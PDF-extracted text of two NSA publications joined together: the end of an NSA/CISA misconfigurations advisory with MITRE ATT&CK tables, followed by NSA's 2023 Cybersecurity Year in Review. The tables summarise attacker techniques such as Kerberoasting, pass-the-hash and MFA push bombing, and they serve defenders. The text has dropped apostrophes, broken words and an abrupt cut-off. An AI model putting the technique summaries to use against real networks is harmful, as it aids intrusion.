Security Systems, https://www.nsa.gov/Press-Room/NewsHighlights/Article/Article/3148990/nsa-releases-future-quantum-resistant-qr-algorithmrequirements-for-national-se/
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
[52] NSA, Enforce Signed Software Execution Policies,
https://media.defense.gov/2019/Sep/09/2002180334/-1/1/0/Enforce%20Signed%20Software%20Execution%20Policies%20-%20Copy.pdf
[53] Joint CSI: Keeping PowerShell: Security Measures to Use and Embrace,
https://media.defense.gov/2022/Jun/22/2003021689/-1/1/0/CSI_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_EMBRACE_202
20622.PDF
[54] NIST, NIST SP 800-218: Secure Software Development Framework (SSDF) Version 1.1:
Recommendations for Mitigating the Risk of Software Vulnerabilities,
https://csrc.nist.gov/publications/detail/sp/800-218/final
Disclaimer of endorsement
The information and opinions contained in this document are provided "as is" and without any warranties or
guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark,
manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United
States Government, and this guidance shall not be used for advertising or product endorsement purposes.
Trademarks
Active Directory, Microsoft, and Windows are registered trademarks of Microsoft Corporation.
MITRE ATT&CK is registered trademark and MITRE D3FEND is a trademark of The MITRE Corporation.
SoftPerfect is a registered trademark of SoftPerfect Proprietary Limited Company.
Telerik is a registered trademark of Progress Software Corporation.
VMware is a registered trademark of VMWare, Inc.
Zimbra is a registered trademark of Synacor, Inc.
Purpose
This document was developed in furtherance of the authoring cybersecurity organizations
 missions, including their
responsibilities to identify and disseminate threats, and to develop and issue cybersecurity specifications and
mitigations. This information may be shared broadly to reach all appropriate stakeholders.
Contact
Cybersecurity Report Feedback: CybersecurityReports@nsa.gov
General Cybersecurity Inquiries: Cybersecurity_Requests@nsa.gov
Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov
Media Inquiries / Press Desk: 443-634-0721, MediaRelations@nsa.gov
To report suspicious activity contact CISA
s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870. When
available, please include the following information regarding the incident: date, time, and location of the incident; type
of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or
organization; and a designated point of contact.
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Appendix: MITRE ATT&CK tactics and techniques
See Table 12
Table 21 for all referenced threat actor tactics and techniques in this
advisory.
Table 12: ATT&CK Techniques for Enterprise 
 Reconnaissance
Technique Title
Active Scanning:
Vulnerability Scanning
T1595.002
Malicious actors scan victims for
vulnerabilities that be exploited for initial
access.
Gather Victim Host
Information
T1592
Malicious actors gather information on
victim client configurations and/or
vulnerabilities through vulnerabilities
scans and searching the web.
Gather Victim Identity
Information:
Credentials
T1589.001
Malicious actors find default credentials
through searching the web.
Phishing for
Information
T1598
Malicious actors masquerade as IT staff
and convince a target user to provide their
MFA code over the phone to gain access
to email and other organizational
resources.
Table 13: ATT&CK Techniques for Enterprise 
 Initial Access
Technique Title
External Remote
Services
T1133
Malicious actors use default credentials for
VPN access to internal networks.
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Technique Title
Valid Accounts:
Default Accounts
T1078.001
Malicious actors gain authenticated
access to devices by finding default
credentials through searching the web.
Malicious actors use default credentials for
VPN access to internal networks, and
default administrative credentials to gain
access to web applications and
databases.
Exploit Public-Facing
Application
T1190
Malicious actors exploit CVEs in Telerik
UI, VM Horizon, Zimbra Collaboration
Suite, and other applications for initial
access to victim organizations.
Phishing
T1566
Malicious actors gain initial access to
systems by phishing to entice end users to
download and execute malicious
payloads.
Trust Relationship
T1199
Malicious actors gain access to OT
networks despite prior assurance that the
networks were fully air gapped, with no
possible connection to the IT network, by
finding special purpose, forgotten, or even
accidental network connections.
Table 14: ATT&CK Techniques for Enterprise 
 Execution
Technique Title
Software Deployment
Tools
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
T1072
Malicious actors use default or captured
credentials on software deployment tools
to execute code and move laterally.
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Technique Title
User Execution
T1204
Malicious actors gain initial access to
systems by phishing to entice end users to
download and execute malicious payloads
or to run code on their workstations.
Command and
Scripting Interpreter
T1059
Malicious actors use scripting languages
to obscure their actions and bypass
allowlisting.
Command and
Scripting Interpreter:
Visual Basic
T1059.005
Malicious actors use macros for initial
access, persistence, and lateral
movement.
Table 15: ATT&CK Techniques for Enterprise 
 Persistence
Technique Title
Account Manipulation
T1098
Malicious actors reset built-in
administrative accounts via predictable,
forgotten password questions.
Table 16: ATT&CK Techniques for Enterprise 
 Privilege Escalation
Technique Title
Valid Accounts
T1078
Malicious actors analyze topical and
nested Active Directory groups to find
privileged accounts to target.
Valid Accounts:
Domain Accounts
T1078.002
Malicious actors obtain loaded domain
credentials from printers and scanners
and use them to move laterally from the
network device.
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Exploitation for
Privilege Escalation
T1068
Malicious actors load vulnerable drivers
and then exploit their known vulnerabilities
to execute code in the kernel with the
highest level of system privileges to
completely compromise the device.
Table 17: ATT&CK Techniques for Enterprise 
 Defense Evasion
Technique Title
Obfuscated Files or
Information:
Command
Obfuscation
T1027.010
Malicious actors often use scripting
languages to obscure their actions.
Table 18: ATT&CK Techniques for Enterprise 
 Credential Access
Technique Title
T1557
Malicious actors force a device to
communicate through actor-controlled
systems, so they can collect information or
perform additional actions.
Adversary-in-theMiddle: LLMNR/NBTNS Poisoning and
SMB Relay
T1557.001
Malicious actors execute spoofing,
poisoning, and relay techniques if Link-Local
Multicast Name Resolution (LLMNR),
NetBIOS Name Service (NBT-NS), and
Server Message Block (SMB) services are
enabled in a network.
Brute Force:
Password Cracking
T1110.002
Malicious actors capture user hashes and
leverage dictionary wordlists and rulesets to
extract cleartext passwords.
Adversary-in-theMiddle
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Technique Title
Credentials from
Password Stores
T1555
Malicious actors gain access to and crack
credentials from PFX stores, enabling
elevation of privileges and lateral movement
within networks.
Multi-Factor
Authentication
Interception
T1111
Malicious actors can obtain password
hashes for accounts enabled for MFA with
smart codes or tokens and use the hash via
PtH techniques.
Multi-Factor
Authentication
Request Generation
T1621
Malicious actors use 
push bombing
against non-phishing resistant MFA to
induce 
MFA fatigue
 in victims, gaining
access to MFA authentication credentials or
bypassing MFA, and accessing the MFAprotected system.
Steal Application
Access Token
T1528
Malicious actors can steal administrator
account credentials and the authentication
token generated by Active Directory when
the account is logged into a compromised
host.
Steal or Forge
Authentication
Certificates
T1649
Unauthenticated malicious actors coerce an
ADCS server to authenticate to an actorcontrolled server, and then relay that
authentication to the web certificate
enrollment application to obtain a trusted
illegitimate certificate.
T1558.001
Malicious actors who have obtained
authentication certificates can use the
certificate for Active Directory authentication
to obtain a Kerberos TGT.
Steal or Forge
Kerberos Tickets:
Golden Ticket
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Technique Title
Steal or Forge
Kerberos Tickets:
Kerberoasting
T1558.003
Malicious actors obtain and abuse valid
Kerberos TGTs to elevate privileges and
laterally move throughout an organization
network.
Unsecured
Credentials:
Credentials in Files
T1552.001
Malicious actors find cleartext credentials
that organizations or individual users store
in spreadsheets, configuration files, and
other documents.
Table 19: ATT&CK Techniques for Enterprise 
 Discovery
Technique Title
Account Discovery
T1087
Malicious actors with valid domain
credentials enumerate the AD to discover
elevated accounts and where they are
used.
File and Directory
Discovery
T1083
Malicious actors use commands, such as
net share, open source tools, such as
SoftPerfect Network Scanner, or custom
malware, such as CovalentStealer to
discover and categorize files.
Malicious actors search for text files,
spreadsheets, documents, and
configuration files in hopes of obtaining
desired information, such as cleartext
passwords.
Network Share
Discovery
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
T1135
Malicious actors use commands, such as
net share, open source tools, such as
SoftPerfect Network Scanner, or custom
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Technique Title
malware, such as CovalentStealer, to look
for shared folders and drives.
Table 20: ATT&CK Techniques for Enterprise 
 Lateral Movement
Technique Title
Exploitation of
Remote Services
T1210
Malicious actors can exploit OS and
firmware vulnerabilities to gain
unauthorized network access,
compromise sensitive data, and disrupt
operations.
Remote Services:
SMB/Windows Admin
Shares
T1021.002
If SMB signing is not enforced, malicious
actors can use name resolution poisoning
to access remote systems.
Use Alternate
Authentication
Material: Application
Access Token
T1550.001
Malicious actors with stolen administrator
account credentials and AD authentication
tokens can use them to operate with
elevated permissions throughout the
domain.
Use Alternate
Authentication
Material: Pass the
Hash
T1550.002
Malicious actors collect hashes in a
network and authenticate as a user
without having access to the user's
cleartext password.
Table 21: ATT&CK Techniques for Enterprise 
 Collection
Technique Title
Data from Network
Shared Drive
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
T1039
Malicious actors find sensitive information
on network shares that could facilitate
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Technique Title
follow-on activity or provide opportunities
for extortion.
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
2023 NSA Cybersecurity
Year in Review.
2023 NSA
CYBERSECURITY
{ Ye a r I n Rev i ew
Welcome
Since World War II, the National Security Agency (NSA) and
its predecessors have protected the United States
 most
sensitive information. As technological advancements have
created a more interconnected world with ever-increasing
threats, NSA
s mission has expanded. NSA has embraced
new responsibilities and operational authorities to ensure
our networks remain secure.
Today, NSA
s cybersecurity mission integrates cryptographic
expertise, foreign signals intelligence, vulnerability analysis,
defensive operations, and more to prevent and eradicate
cyber threats to three key areas.
NSA Cybersecurity protects and defends:
 National Security Systems (NSS): Networks that
contain classified information or are otherwise critical
to United States military and intelligence activities. It
is vital that these networks remain secure to ensure
U.S. warfighting capabilities are mission-ready and to
protect the nation
s most sensitive information.
 The Department of Defense (DoD): U.S. Military
services and combatant commands as well as U.S.
government agencies and departments related to
national security.
 The Defense Industrial Base (DIB): The ever-growing
group of companies that design, develop, operate,
and maintain the Department of Defense
s critical
systems, platforms, and technologies required to
defend the nation. Their products, services, and
capabilities are vital to the security of the U.S. and
our allies.
In an effort to be more transparent, NSA publishes an
annual year in review sharing information regarding
cybersecurity efforts that better equipped U.S. defenses
against high priority cyber threats. NSA
s efforts to help
secure the nation
s most sensitive systems also help your
cybersecurity because NSA cascades these solutions
through public guidance and engages with key technology
providers to help them bolster the security of their products
and services.
Visit NSA.gov/cybersecurity to access the report
digitally. Provide NSA Cybersecurity with feedback
or ask questions by emailing cybersecurity@nsa.gov
Top and bottom image courtesy of Getty Images, middle photo courtesy DoD
www.NSA.gov/cybersecurity
CONTENTS
Defending our
Most Critical
Networks
Modernizing
Cryptographic
Solutions
Letters From
the Director
of NSA & the
Director of NSA
Cybersecurity
Arming Net
Defenders with
Guidance
Protecting
the Warfighter &
Supporting
Combatant
Commands
Follow us @NSACyber
Vigilance
Toward National
Threat &
Priorities
Researching
Cybersecurity
Solutions
Partnering
with Industry
& Defense
Industrial
Base
Developing
Current
and Next
Generation
Cyber Experts
Cybersecurity is
National Security.
General Paul M. Nakasone
Commander, U.S. Cyber Command,
Director, NSA/Chief CSS
A Letter
From the NSA Director
In my role as the Director of the National Security Agency
(NSA), I am humbled and privileged to lead a workforce that
supports every component of the Intelligence Community
and Department of Defense through its signals intelligence
and cybersecurity missions.
We need to be able to respond to threats from the PRC,
Russia, and other global adversaries today and in the
future. We must stay ahead of our global competitors
who constantly seek to reshape the global information
environment and the world order as we know it.
NSA is the world leader in making and breaking codes.
Talented people at our Agency work tirelessly to protect
our Nation from our foreign adversaries.
Authorities like Section 702 of the Foreign Intelligence
Surveillance Act (FISA) allow us to do that. FISA Section
702 is a key foreign intelligence authority that helps keep
the United States and its allies safe and secure. Intelligence
from Section 702 is used every day to protect the nation
from critical threats, inform U.S. Government strategy,
and save American lives. Since any lapse in this law would
have a blinding effect on our insights into hostile foreign
actors operating beyond our borders, we look to Congress
reauthorizing Section 702.
s contributions are critical in the current era of strategic
competition, wherein global powers are competing
economically, militarily, technologically and diplomatically.
The People
s Republic of China (PRC) has emerged as the
pacing challenge to the United States and as a competitor
with both the intent and ability to reshape the international
order to fit its own designs. The PRC, an adversary that is
unique in the scope, scale, and sophistication of the threat
it poses, has stated its desire to become one of the world
leading powers.
Russia remains an acute threat and continues to threaten
regional security and global stability through its disregard
of international norms and its willingness to use its
weapons to target civilians and critical infrastructure.
ve witnessed a telling example of this during Russia
illegal invasion of Ukraine. Russia has also deployed
information operations intended to weaken democratic
institutions around the world.
The authorities with which NSA is entrusted allow NSA
to tackle our most significant national security concerns,
including cybersecurity. Recently, we
ve seen the nature
of conflict evolve: cyberspace is contested space. It
become clear that the shift from competition to crisis to
conflict can now occur in weeks, days, or even minutes.
Every day at NSA, we strive to prevent and eradicate cyber
threats to U.S. National Security Systems, the Department
of Defense, and the Defense Industrial Base (DIB).
www.NSA.gov/cybersecurity
The new National Cyber Security Strategy outlines a clear and
dedicated focus on leveraging international partnerships to
pursue shared goals in securing software, critical infrastructure,
and global networks, dismantling and defeating ransomware
actors, increasing operational collaboration in cyberspace, and
building incident detection and response capabilities.
Our intelligence and cybersecurity relationships with our allies and
partners are a strategic asset that will increasingly factor into our
competition with our rivals, especially in technological competition.
The global landscape becomes ever more complex as the
technology we use in cyberspace continues to advance. One such
example is Artificial Intelligence (AI), which has the capacity to
upend multiple sectors of society simultaneously. We must stay
ahead of our global competitors in the race to understand and
harness its potential, as well as protect ourselves from adversarial
use. At NSA, we are uniquely positioned to do so by coalescing our
deep technical expertise, threat insights, and authorities to support
these efforts.
I recently announced that NSA is consolidating its various AI
security related activities into a new entity, the NSA Artificial
Intelligence Security Center. The AI Security Center, located within
our Cybersecurity Collaboration Center, will allow us to work closely
across the Intelligence Community, the Department of Defense, the
industrial base, national labs, academia, and select foreign partners
to ensure the United States
 enduring advantage in AI.
s principles and values, along with our culture of compliance
and protection of privacy and civil liberties, have served as the
foundation for the cybersecurity successes detailed in this report
and will continue to serve as the bedrock of NSA in the future.
At NSA, our people and our partnerships make the difference.
NSA employees have a steadfast belief in the importance of the
trust granted to them through the oath they swore to uphold.
Our deep and enduring partnerships allow us to tackle threats
and scale solutions together to make this Nation 
 and our allies
 more secure. On behalf of NSA, I share my sincere thanks for
the work all of our partners do in this space, since our collective
cyber resilience and agile responses to threats are better when
we work together.
PAUL M. NAKASONE
General, U.S. Army
Commander, U.S. Cyber Command,
Director, National Security Agency/Chief, Central Security Service
Follow us @NSACyber
A Letter
From the NSA Cybersecurity Director
The NSA Cybersecurity Directorate was established with
the intention of connecting to industry and other partners.
That trend continued in the past year, as we leaned into
partnerships more than ever before. We focus on taking
what we know and turning it into actions that secure
networks and disrupt our adversaries in new ways. Our
domestic and international partnerships help us tackle
threats together to scale cybersecurity solutions and
make even greater impacts.
When we know something, it only provides value when
net defenders can take real action with it. By sharing
information bi-directionally in an unclassified environment
with our partners, we improve both cybersecurity and
national security.
The combined talent of our partnerships is the greatest
competitive advantage we have to confront the increasingly
sophisticated threats we see today.
In the past year, we
ve exposed numerous cybersecurity
threats. Working with industry and international partners,
we identified indicators of compromise associated with a
People
s Republic of China (PRC) state-sponsored cyber
actor using living off the land techniques -- using built-in
network tools to evade defenses without leaving a trace-to target networks across U.S. critical infrastructure. We
benefitted from multiple private sector entities to better
understand this threat and released guidance to help
network defenders hunt and detect this type of malicious
activity on their systems and critical networks.
Working with partner agencies also allowed us to identify a
sophisticated Russian cyberespionage Snake malware tool
being used in over 50 countries worldwide. Together, we
attributed Snake operations to a known unit within Center
16 of Russia
s Federal Security Service. The technical
details we released with partners enabled Federal Bureau
of Investigation (FBI) operations and helped many
organizations find and shut down the malware globally.
Separately, collaboration with industry partners led to
discovering a vulnerability in Citrix servers that could
have resulted in information stolen from the Defense
Industrial Base. Because of these partnerships, the zeroday vulnerability was exposed and patched , and the
number of vulnerable servers across the country dropped
significantly.
Our Cybersecurity Collaboration Center (CCC) allows us to
build coalitions to share information together and address
threats like these. This year, the CCC tripled its partnerships,
so we now collaborate in more than 750 open and robust
relationships across industry and government, which
allows us to scale prevention, detection, and mitigation
techniques to billions of endpoints worldwide. The CCC
scaled its cybersecurity as a service program to include
small-to-medium businesses within the Defense Industrial
Base (DIB) supply chain. This year
s 400% increase in
enrollments in our services helps to ensure our critical
partners in defense 
 including small and medium-size
businesses 
 don
t have to secure their systems alone.
Our partnerships allow us to lean forward and proactively
share insights as we do what we
re charged to do: help
secure our Nation
s defenses, its most critical networks,
and the DIB.
One emerging threat 
 and opportunity 
 is Artificial
Intelligence (AI). AI and machine learning technologies are
being developed and proliferating faster than companies
and governments can shape norms, create standards,
and ensure positive outcomes. While the tools may
enable amazing new defensive capabilities, they may also
empower attackers. NSA
s recently established Artificial
Intelligence Security Center within our Cybersecurity
Collaboration Center is the Agency
s new focal point to
apply the unique insights from NSA signals intelligence and
technological expertise, while collaborating with industry
to help industry counterparts understand, prevent, and
mitigate 
 threats in the AI ecosystem. The center will
serve as a focal point to develop best practices, evaluation
methodology, and risk frameworks, while we aim to
promote secure adoption of AI capabilities.
We also made progress in the marathon to transition to
quantum-resistant cryptography to protect our networks,
the technology we rely on, and our weapons platforms.
We completed cryptographic roadmaps for each U.S.
combatant command coalition partner to help our partners
identify where they need to invest to secure against
advanced cyber threats and become fully interoperable
with U.S. and allied forces.
In the end, these significant outcomes are powered by the
folks at NSA and our partner organizations who innovate,
come up with brilliant ideas, and act on them with urgency
to secure our Nation and our partners now and in the future.
Regards,
Rob Joyce
Director, NSA Cybersecurity
www.NSA.gov/cybersecurity
Together, the cybersecurity
community is so much better
through the power of partnership.
Rob Joyce
Director, NSA Cybersecurity
Vigilance
Toward National Threats and Priorities
Countering Global Threats
Together with U.S. and international partners NSA continues to scale its
impact against increasing global threats and sophisticated adversaries.
While the U.S. Government relies on NSA
s unique foreign signals intelligence
insights to inform key decisions, public and private sector collaboration
builds on that foundation to better inform understanding of the threats and
how to counter them.
Every organization brings their own unique capabilities, authorities, and
insights to paint a broader picture 
 thereby enhancing NSA
s ability to
prevent and eradicate some of the world
s most concerning cyber threats.
Exposing and Mitigating People
s Republic of China
Malicious Activity
Together with key industry partners, NSA identified a People
s Republic of
China (PRC) state-sponsored cyber actor using built-in network tools to
target U.S. critical infrastructure. To help network defenders hunt and detect
this type of PRC malicious activity on their systems, NSA coordinated with
U.S. and international partners to publicly release the 
People
s Republic of
China State-Sponsored Cyber Actor Living off the Land to Evade Detection
joint Cybersecurity Advisory. The advisory provides an overview of hunting
guidance and associated best practices, and includes examples of actor
commands and detection signatures.
Cyber actors find it easier and more effective to use capabilities
already built into critical infrastructure environments. A PRC statesponsored actor is living off the land, using built-in network tools
to evade our defenses and leaving no trace behind, that makes it
imperative for us to work together to find and remove the actor from
our critical networks.
Rob Joyce
Director, NSA Cybersecurity
www.NSA.gov/cybersecurity
In another instance, when an industry partner detected
PRC actors targeting critical DIB organizations using a
zero-day vulnerability, NSA immediately shared technical
indicators with DIB partners to enable discovery on
their networks. The vulnerability specifically targeted
widely-used devices throughout the DIB so NSA
s daily
engagements with industry over a two-month period
helped disrupt and mitigate the campaign.
Hunting Russian Intelligence
Snake
 Malware
In coordination with partners, NSA identified a
sophisticated Russian cyberespionage Snake malware
tool being used in over 50 countries worldwide. Together,
NSA, USCYBERCOM
s Cyber National Mission Force,
FBI, Cybersecurity and Infrastructure Security Agency,
the Canadian Cyber Security Centre, the Australian
Cyber Security Centre, the New Zealand Government
Communications Security Bureau, and the U.K.
s National
Cyber Security Centre, attributed Snake operations
to a known unit within Center 16 of Russia
s Federal
Security Service. This infrastructure was identified across
North America, South America, Europe, Africa, Asia, and
Australia, including the U.S. and even Russia. The technical
detail released with partners helped FBI operations,
partnering with many organizations, find and shut down
the malware globally.
Follow us @NSACyber
Collaborating Internationally
To Release Guidance
Working across the U.S. Government and international
collaborators, NSA has enabled increased sharing through
Cybersecurity Advisories regarding nation-state threats.
In a first, we collaborated with the Japan National Police
Agency and the Japan Center of Incident Readiness and
Strategy for Cybersecurity, NSA alongside the FBI and
the U.S. Cybersecurity and Infrastructure Security Agency
(CISA), released a joint Cybersecurity Advisory to detail
activity of PRC-linked cyber actors known as BlackTech.
BlackTech demonstrated capabilities in modifying router
firmware without detection and exploiting routers
domain-trust relationships for pivoting from international
subsidiaries to their parent companies in Japan and the U.S.
In another first, NSA worked with the Republic of Korea
National Intelligence Service, National Police Agency,
and Ministry of Foreign Affairs along with our partners
at the FBI, and U.S. Department of State, to jointly issue
a Cybersecurity Advisory highlighting the use of social
engineering by Democratic People
s Republic of Korea
state-sponsored cyber actors to enable computer network
exploitation globally against individuals employed by
research centers and think tanks, academic institutions,
and news media organizations.
The Department of Defense (DoD) serves as
the Sector Risk Management Agency for the
Defense Industrial Base (DIB).In this role, the
Department interfaces with DIB companies,
monitors and prioritizes threats, oversees
incident management, and provides technical
assistance, among other duties. The Department
DIB cybersecurity initiatives include the DIB
Cybersecurity Program, the DoD Cyber Crime
Center
s DoD-DIB Collaborative Information
Sharing Environment, National Security Agency
Cybersecurity Collaboration Center, and the
Enduring Security Framework.
Excerpt from the DoD Cyber Strategy Summary
released September 2023
www.NSA.gov/cybersecurity
Partnering
With Industry and Defending the Defense Industrial Base
Protecting the Defense Industrial Base (DIB)
Although many people associate the DIB with large defense contractors, more than
70% of the DIB is made up of small businesses. Upon signing a contract with DoD,
these companies often become targets for nation state actors. Small businesses
generally do not have the resources to defend against nation-state activity alone.
NSA works with DIB companies large and small 
 NSA
s critical partners in defense
- bringing the world
s leading code-making and code-breaking Agency to stand by
their side.
We are at the forefront of change to share our insights with
the private sector. We see the power of NSA
s expertise in a
way we haven
t seen before.
Morgan Adamski
Chief, Cybersecurity Collaboration Center
NSA provides no-cost cybersecurity services to DoD
contractors, informed by NSA
s decades of expertise in making
and breaking codes. These services are designed to defend
against the top ways NSA sees foreign adversaries targeting the
DIB and are infused with NSA
s unique insights and analytics. In
2023, thanks to aggressive outreach and development efforts,
NSA grew cybersecurity service enrollment by almost 400%.
NSA now provides cybersecurity assistance to more than 600
companies within the DoD supply chain, including suppliers
who may lack adequate cybersecurity resources of their own.
While these services are open to any company with an active
DoD prime contract or subcontract, NSA launched several new
campaigns in 2023 to prioritize outreach to companies supporting:
What NSA
s Industry
Partners Are Saying:
As a small business, we don
have the unlimited resources
that the big players have, so
we appreciate anything that
gives us an edge. It is one less
thing to think about, one less
expense, and one less worry.
1. The U.S. Indo-Pacific Command Area of Responsibility
2. The Russia/Ukraine conflict, and
3. DoD
s priority weapons systems
Further, NSA worked with DoD
s Office of Small Business to ensure minority-owned
small businesses are aware of these services and have the opportunity to leverage
them for cost savings and better network security.
Follow us @NSACyber
The Enduring Security Framework (ESF), through collaboration with 17 government and 62 industry partners, released 6
security products addressing threats within the Communications, DIB, and Information Technology critical infrastructure
sectors. Specifically, ESF
s products addressed threats associated with 5G, identity and access management, and the
software supply chain. These issuances provided impactful recommendations, and established industry best practices
to mitigate the identified threats.
 Securing the Software Supply Chain: Recommended
Practices Guide for Suppliers
 Securing the Software Supply Chain: Recommended
Practice Guide for Customers
 Potential Threats to 5G Network Slicing
 Recommended Best Practices for Administrators 
Identity and Access Management
 Identity and Access Management Educational
Aid & associated talking points
Photo courtesy of Getty Images
 5G Network Slicing: Security Considerations for Design,
Deployment, and Maintenance
Scaling DIB Cybersecurity Services
This year, NSA also enriched its offerings by harnessing
s unique insights on nation-state cyber activity.
s Protective Domain Name System (PDNS)
service, which blocks users from connecting to known
malicious or suspicious websites, is a prime example.
NSA developed a custom threat feed for PDNS through
which NSA is providing hundreds of unique Indicators
of Compromise (IOCs) per week to its DNS filtering
vendor so they can update their blocklist. These IOCs
are derived from three sources:
1. NSA
s SIGINT insights,
2. NSA analytics, or
3. Tipped from inter-agency, industry,
or international partners.
To date, NSA
s PDNS service has generated 10 billion
blocks for participating customers. Of these, 20 million
blocks have come from NSA-provided indicators,
meaning NSA is thwarting emerging malicious cyber
activity which would have otherwise gone undetected
and unmitigated. These IOCs are also being shared
across the U.S. Government and international partners
to enable defensive actions.
This year, NSA also improved its vulnerability scanning
program to offer comprehensive attack surface
management support. This program offers two significant
benefits for DIB businesses. First, it leverages open source
tools to provide companies with a full inventory of their
internet-facing assets, since you can
t protect what you
t know about. Then, this program runs vulnerability
scans across those assets and provides a tailored report
with vulnerabilities prioritized leveraging NSA
s insights
about what nation-state actors are exploiting.
New this year, NSA also launched a 
continuous monitoring
feature. Every day, NSA monitors various sources to see
when nation-state actors begin exploiting publicly known
vulnerabilities. When a vulnerability goes from 
known
exploited,
 NSA immediately searches its asset discovery
inventory to identify which DIB customers may have that
vulnerability within their environment, and flag for them
that there is active exploitation against a device that is
present within their environment. These notices have an
80% response rate and prove that as a result, companies
are finding and fixing issues prior to compromise and
data exfiltration.
This year, the attack surface management program helped
uncover a massive, People
s Republic of China-associated
campaign targeting multiple DIB companies by leveraging
a vulnerability in Citrix environments. As a result of NSA
collaboration with large and small DIB companies and
Citrix, NSA publicly exposed this campaign in conjunction
with a patch release. Independent researchers published
blogs noting that within days of the advisory
s publication,
the number of vulnerable servers across the U.S. and
allied nations dropped by almost 25%.
s threat intelligence collaboration service matured
this year. Through this service, companies can receive
non-public, DIB-specific NSA threat intelligence through
a secure, unclassified collaboration channel. This method
gives companies access to NSA
s analytic capabilities
simply by opening an app on their phone, increasing their
capacity and ability to take action and better protect
their- and their customer
s-networks.
www.NSA.gov/cybersecurity
Increasing Innovative Pilots
Investment in DIB cybersecurity services didn
t stop there. NSA launched four new pilots this year, which will run for
12 months and will measure if the service is effective at mitigating nation-state activity, low-cost, and scalable with no
significant overhead to participating companies. The new pilots are:
 Cloud Security: As cloud computing is swiftly becoming the norm for cybersecurity, NSA is focusing efforts
on discovering and mitigating vulnerabilities and misconfigurations within the DIB that leave their networks
and intellectual property vulnerable. This pilot will also provide NSA CCC analysts with the data necessary
to understand the DIB cloud attack surface, which will be used to craft and distribute DIB-specific cloud
security guidance.
 Threat Hunting: Identifying and mitigating threats before they cause harm involves actively providing a system
information and event management platform to DIB partners to facilitate the detection and mitigation of malicious
and suspicious network activity. NSA analysts will hunt alongside the DIB partners and will develop threat-hunting
guides and analytics to distribute throughout the DIB.
 Phishing Protection: Phishing attacks are pervasive. This pilot provides DIB customers with a secure email
gateway to filter phishing attacks, along with access to a sandbox to better understand any malware associated
with the malicious attachments to enable appropriate mitigation development.
 Autonomous Penetration Testing: This pilot innovatively leverages automated tools, algorithms, and AI to identify
digital vulnerabilities more continuously than human capabilities. Mimicking the actions of hackers, this testing
provides real-time threat assessments to reduce human intervention, increasing efficiency and providing a more
insightful view into how our adversaries are thinking.
By the Numbers
100s
312,000
1.3M
550+
Multiple
Partners
Blocks generated
from NSA
s unique IOCs
Partner Vulnerability
Notifications sent, with
80% response rate
Follow us @NSACyber
Malicious/suspicious domains
processed and/or blocked, including
ransomware activity and nationstate malware, spearphishing,
and botnets
Internet-facing assets identified
and inventoried for participating
DIB companies
Unique clusters of known
nation-state activity consistently
tracked by NSA and industry
Of new unique IOCs fed
into NSA
s blocklist weekly
Vulnerabilities discovered
and flagged for remediation
Nation-state campaigns targeting
DIB revealed, including those
leveraging zero-day vulnerabilities
Securing Artificial Intelligence (AI)
s new AI Security Center, housed at the Cybersecurity
Collaboration Center will promote the secure development,
integration, and adoption of AI capabilities within national
security systems and the DIB. This center will also leverage
s unique foreign signals intelligence insights to help
industry understand how adversaries use and target AI.
By engaging leaders from U.S. industry, national labs,
academia, in concert with the Intelligence Community, the
DoD, and foreign partners, the AI Security Center will help
develop AI security best practices and guidance.
Partnering to Tackle Threats
and Establish Standard
The Center for Cyber Security Standards (CCSS) is focused
on authoring, informing, and driving adoption of standards
for telecommunications, with a focus on securing 5G and
preparing protocols for quantum-resistant cryptography.
To date, CCSS has authored and submitted more than
95 standards for 5G, cloud networks, and internet
protocols. This work ensures security is baked in and
reduces our adversaries
 ability to steal U.S. intellectual
property. NSA engages in more than 15 Standards
Development Organizations and more than 40 working
groups. NSA supported the U.S. Government by providing
technical expertise in various forums. At the International
Telecommunication Union Telecommunication Sector
forum, CCSS served as the acting U.S. delegation working
in close partnership with Department of State. CCSS
advanced multiple secure protocol standards drafts at the
Internet Engineering Task Force, to ensure post-quantum
resistance and interoperability.
s CCSS is now a member of the Open Radio Access
Network (O-RAN) Alliance, an international consortium
that develops Radio Access Network (RAN) standards for
5G. The O-RAN Alliance has been historically closed to U.S.
Government participation and formerly more focused on
market incentives than security requirements. With RAN
technology at the core of 5G infrastructure, participation in
the consensus-driven O-RAN Alliance represents a way for
the U.S. to bolster security objectives for 5G.
Through the Enduring Security Framework, CCSS completed
a study to reinvigorate U.S. and allied investment in Standards
Development Organizations (SDOs), which ensured the
long-term security of critical technologies. The group
assessed technical and geopolitical threats to international
SDOs and developed strategies to counter these threats.
NSA and its U.S. Government, industry and international
